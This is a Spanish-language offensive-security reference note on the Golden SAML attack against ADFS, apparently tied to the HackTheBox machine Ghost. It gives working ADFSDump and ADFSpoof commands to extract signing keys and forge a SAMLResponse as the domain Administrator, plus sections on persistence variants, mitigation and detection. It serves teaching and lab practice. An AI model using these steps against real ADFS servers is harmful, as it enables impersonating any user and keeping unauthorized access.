---
topic: ADFS — Golden SAML
tags: [windows, active-directory, adfs, saml, golden-saml, persistence]
---

# ADFS — Golden SAML

[🌐 English](adfs-golden-saml.en.md) | **Español**

## Concepto

ADFS firma los `SAMLResponse` con una clave privada y un certificado de firma. Si un atacante con acceso al servidor extrae ese material, puede firmar respuestas válidas para cualquier usuario y atributo sin conocer su contraseña. Es el equivalente SAML de un Golden Ticket: funciona aunque se cambien las contraseñas y sobrevive mientras no se rote el certificado.

## Cuándo aplica

- ADFS con una aplicación federada (SharePoint, AWS, GitLab, un portal interno).
- Control de la cuenta de servicio de ADFS o del servidor que aloja el rol.
- Capacidad de leer el almacén de claves (DPAPI, base de datos de configuración).
- El relying party confía en el certificado de firma y no valida el canal.

## Procedimiento

1. Confirmar el flujo SAML: `/adfs/ls/`, `SAMLRequest`, `SAMLResponse` y `postResponse`.
2. Identificar el issuer y el relying party.
3. Con `ADFSDump.exe` extraer la clave privada, la clave de firma cifrada, el issuer y la configuración del relying party.
4. Convertir la clave privada de hexadecimal a binario y la clave de firma de base64 a binario.
5. Forjar un `SAMLResponse` con `ADFSpoof.py` para el usuario objetivo.
6. Enviarlo al endpoint y usar la cookie resultante.

## Comandos

```powershell
.\ADFSDump.exe
```

```bash
echo "<HEX_KEY>" | tr -d '-' | xxd -r -p > private_key.bin
echo "<BASE64_SIGNING_KEY>" | base64 -d > encrypted_signing_key.bin
```

```bash
python ADFSpoof.py -b encrypted_signing_key.bin private_key.bin -s core.ghost.htb saml2 \
  --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' \
  --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' \
  --nameid 'Administrator@ghost.htb' \
  --rpidentifier 'https://core.ghost.htb:8443' \
  --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute>'
```

El resultado se envía como `SAMLResponse` en un POST a `/adfs/saml/postResponse`.

## Variantes

- Forjar solo el `NameID` si la aplicación no valida los atributos.
- Usar `--assertions` para incluir grupos o roles administrativos.
- Reutilizar el certificado robado en otro relying party con la misma confianza.
- Persistencia: crear un usuario o un certificado nuevo en ADFS para no depender del material robado.

## Limitaciones

- El certificado debe seguir siendo válido y confiado por la aplicación.
- Algunas aplicaciones validan `InResponseTo`, `Destination` o la firma del mensaje completo.
- ADFS 2019+ puede proteger el material con claves adicionales.
- El acceso al servidor o a la cuenta de servicio es un requisito previo.

## Mitigación

- Proteger el servidor ADFS y la cuenta de servicio con tier-0.
- Rotar certificados de firma y claves ante cualquier sospecha.
- Monitorizar la extracción de claves y el acceso a la configuración de ADFS.
- Validar `InResponseTo`, `Destination`, `Audience` y la firma completa en el relying party.
- Usar autenticación basada en certificados y MFA para accesos privilegiados.

## Detección

- Ejecución de `ADFSDump`, `ADFSpoof`, Mimikatz o herramientas de volcado de DPAPI.
- Acceso a la base de datos de configuración de ADFS o al almacén de claves.
- `SAMLResponse` con `NameID` o atributos inusuales.
- Logins SAML desde IPs o dispositivos nuevos sin autenticación previa.

## Referencias

- [Mandiant — Golden SAML](https://www.mandiant.com/resources/blog/golden-saml-new-attack-surface-saml)
- [ADFSDump](https://github.com/mandiant/ADFSDump)
- [ADFSpoof](https://github.com/mandiant/ADFSpoof)
- [0xdf — Ghost](https://0xdf.gitlab.io/2025/04/05/htb-ghost.html)
- [Ficha Ghost](../../machines/windows/ghost/README.md)
